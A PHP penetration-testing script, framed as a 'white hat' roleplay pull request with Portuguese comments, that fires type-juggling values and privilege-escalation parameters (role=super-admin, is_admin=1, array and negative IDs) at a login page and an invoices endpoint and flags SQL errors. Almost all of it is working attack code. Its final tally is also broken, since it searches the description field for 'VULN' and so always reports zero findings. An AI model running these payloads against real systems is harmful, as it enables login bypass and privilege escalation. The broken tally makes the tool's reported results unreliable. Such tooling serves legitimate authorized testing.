<?php
// ▓ Roleplay: White Hat — Parameter Tampering Tool
// Pentester ético. Testa type juggling e param manipulation.
// PULL REQUEST START

/**
 * Gera payloads de parameter tampering e type juggling.
 * Uso: php param_tamper.php [URL]
 */

$base = getenv('APP_URL') ?: 'http://127.0.0.1:8000';
$target = $argv[1] ?? "$base/login";

echo "[WHITE-HAT] Parameter Tampering Tool v1.0\n";
echo "[WHITE-HAT] Alvo: $target\n";
echo str_repeat('═', 50) . "\n";

// Payloads de type juggling (PHP loose comparison)
$typeJugglingPayloads = [
    ['desc' => 'boolean true',     'value' => true],
    ['desc' => 'integer 0',        'value' => 0],
    ['desc' => 'integer 1',        'value' => 1],
    ['desc' => 'string "0"',       'value' => '0'],
    ['desc' => 'string "1"',       'value' => '1'],
    ['desc' => 'null',             'value' => null],
    ['desc' => 'empty array',      'value' => []],
    ['desc' => 'array [true]',     'value' => [true]],
    ['desc' => 'scientific 0e123', 'value' => '0e123456'],
    ['desc' => 'hex string',       'value' => '0x61646d696e'],
];

// Payloads de param manipulation
$paramPayloads = [
    ['desc' => 'role elevation',   'field' => 'role',     'value' => 'super-admin'],
    ['desc' => 'is_admin flag',    'field' => 'is_admin', 'value' => '1'],
    ['desc' => 'negative ID',     'field' => 'id',       'value' => '-1'],
    ['desc' => 'float ID',        'field' => 'id',       'value' => '1.5'],
    ['desc' => 'array ID',        'field' => 'id[]',     'value' => '1'],
];

$results = [];

// 1. Type Juggling contra login
echo "\n[TYPE JUGGLING]\n";
foreach ($typeJugglingPayloads as $p) {
    $ch = curl_init($target);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query([
            'email' => is_array($p['value']) ? $p['value'] : (string)$p['value'],
            'password' => is_array($p['value']) ? $p['value'] : (string)$p['value'],
            '_token' => 'test',
        ]),
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_TIMEOUT => 10,
    ]);
    curl_exec($ch);
    $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    $verdict = $status === 500 ? 'FAIL' : 'OK';
    echo "  [{$verdict}] {$p['desc']} → {$status}\n";
    $results[] = ['type' => 'juggling', 'desc' => $p['desc'], 'status' => $status];
}

// 2. Parameter Manipulation
echo "\n[PARAM MANIPULATION]\n";
foreach ($paramPayloads as $p) {
    $url = "{$base}/invoices?" . http_build_query([$p['field'] => $p['value']]);
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_TIMEOUT => 10,
    ]);
    $body = curl_exec($ch);
    $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    $hasError = stripos($body ?: '', 'sqlstate') !== false;
    $verdict = $hasError ? 'VULN' : ($status === 500 ? 'FAIL' : 'OK');
    echo "  [{$verdict}] {$p['desc']} ({$p['field']}={$p['value']}) → {$status}\n";
    $results[] = ['type' => 'param', 'desc' => $p['desc'], 'status' => $status];
}

echo str_repeat('═', 50) . "\n";
$vulns = count(array_filter($results, fn($r) => str_contains($r['desc'] ?? '', 'VULN')));
echo "[WHITE-HAT] " . count($results) . " testes, $vulns vulnerabilidades\n";

// PULL REQUEST END
